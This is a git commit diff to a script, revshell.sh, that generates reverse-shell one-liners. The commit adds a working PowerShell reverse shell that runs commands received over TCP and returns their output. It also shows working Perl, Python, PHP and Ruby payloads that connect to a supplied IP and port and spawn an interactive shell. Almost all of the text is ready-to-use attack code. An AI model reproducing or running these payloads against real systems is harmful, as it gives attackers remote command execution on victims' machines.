541e52adf6ce7cbe24ec364860ad6e2708ed32fe
Anikin Luke Abales <108006281+abalesluke@users.noreply.github.com>
2024-09-14 21:45:38 +0800

    added powershell reverse shell

--- revshell.sh
+++ revshell.sh
@@ -16,10 +16,13 @@ generate_shell() {
     local port="$3"
 
     case "$lang" in
-        perl)
+        powershell | ps)
+            echo "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
+            ;;
+        perl | pl)
             echo "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
             ;;
-        python)
+        python | py)
             echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
             ;;
         bash)
@@ -28,7 +31,7 @@ generate_shell() {
         php)
             echo "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
             ;;
-        ruby)
+        ruby | rb)
             echo "ruby -rsocket -e 'TCPSocket.new(\"$ip\", $port).tap { |s| exec('/bin/sh -i', :in => s, :out => s, :err => s) }'"
             ;;
         netcat | nc)
